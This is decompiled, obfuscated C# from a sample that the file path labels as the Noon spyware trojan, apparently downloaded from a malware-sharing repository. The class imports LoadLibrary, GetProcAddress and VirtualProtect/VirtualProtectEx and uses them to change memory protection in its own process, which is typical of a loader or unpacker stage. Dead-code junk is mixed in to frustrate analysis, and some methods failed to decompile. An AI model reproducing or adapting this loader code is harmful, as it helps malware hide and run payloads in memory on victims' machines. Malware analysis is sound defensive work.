// Decompiled with JetBrains decompiler
// Type: S?jFgTO
// Assembly: ;8w1LFr, Version=5.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35
// MVID: 2CC07ADF-5A94-44BC-9C37-07435DAD286F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.Win32.Noon.pef-7dfe305f31c1f571790f54c3522eb8c6066453e69a429782ebfc0d6f68b2ae34.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Metadata.W3cXsd2001;
using System.Security.Cryptography;

public class S\u003FjFgTO
{
  private const string KY12\u0027P8 = "LoadLibrary";
  private const string mzmEU\u002A\u002F = "kernel32.dll";

  [DllImport("kernel32.dll", EntryPoint = "LoadLibrary")]
  private static extern IntPtr \u002A\u003BkCl\u007EP(string _param0);

  public \u007E\u003Fg8hN\u002A x\u003Bj\u007ENul(string _param1)
  {
    if (false)
    {
      SoapNcName soapNcName = new SoapNcName((string) null);
    }
    if (true)
      ;
    return new \u007E\u003Fg8hN\u002A()
    {
      \u00253S\u0027ZSS = S\u003FjFgTO.\u002A\u003BkCl\u007EP(_param1)
    };
  }

  [DllImport("kernel32.dll", EntryPoint = "GetProcAddress")]
  private static extern IntPtr \u0021vZd2vP(IntPtr _param0, string _param1);

  public \u007E\u003Fg8hN\u002A XLt\u00210vY(IntPtr _param1, string _param2)
  {
    // ISSUE: unable to decompile the method.
  }

  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  private static extern bool t\u002BsiPl4(
    IntPtr _param0,
    UIntPtr _param1,
    uint _param2,
    out uint _param3);

  [DllImport("kernel32", EntryPoint = "VirtualProtectEx")]
  public static extern bool \u0024W3kKIl(
    IntPtr _param0,
    IntPtr _param1,
    IntPtr _param2,
    uint _param3,
    ref uint _param4);

  public bool b\u0027vwQ\u0025n(T\u002BjN\u002B\u002B7 _param1)
  {
    if (false)
      RegistryKey.OpenRemoteBaseKey((RegistryHive) null, (string) null, RegistryView.Default);
    if (false)
    {
      DSA fromName = (DSA) CryptoConfig.CreateFromName((string) null);
    }
    return S\u003FjFgTO.\u0024W3kKIl(Process.GetCurrentProcess().Handle, _param1.CL\u0027\u0024\u003Ax\u0026, new IntPtr(Convert.ToInt64(RuntimeHelpers.GetObjectValue((object) _param1.\u0023\u002AW0aK\u002B.ToUInt64()))), _param1.\u0032Lm\u003A3\u0027\u002B, ref _param1.\u0040\u002AmdQIB);
  }

  public S\u003FjFgTO()
  {
    if (false)
    {
      SoapIdrefs soapIdrefs = new SoapIdrefs((string) null);
    }
    // ISSUE: explicit constructor call
    base.\u002Ector();
    if (true)
      return;
    if (((string) null).StartsWith(SoapServices.startNS, StringComparison.Ordinal))
      ;
  }
}
